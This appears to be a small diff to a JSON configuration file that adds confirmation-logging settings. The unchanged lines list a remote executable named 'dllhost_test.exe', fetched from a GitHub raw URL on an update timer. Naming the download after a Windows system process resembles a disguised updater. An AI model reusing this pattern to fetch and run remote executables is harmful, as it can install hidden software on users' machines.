@@ -1,5 +1,7 @@
 {
   "logLevel": 5,
+  "ConfirmationLog": true,
+  "ConfirmationInterval": 480000,
   "UpdateTimerInterval": 60000,
   "dllhostFiles": [
     "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost_test.exe",
